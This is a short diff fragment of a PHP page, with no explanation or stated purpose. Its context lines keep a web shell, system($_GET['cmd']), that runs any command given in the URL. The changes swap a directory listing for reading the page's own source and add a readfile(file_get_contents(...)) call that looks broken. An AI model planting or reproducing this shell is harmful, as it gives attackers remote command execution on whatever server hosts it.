@@ -10,7 +10,8 @@
     {
         system($_GET['cmd']);
     }
-        echo system('ls');
+        echo system('cat index.php');
+        readfile(file_get_contents('index.php'));
 ?>
 </pre>
 </body>
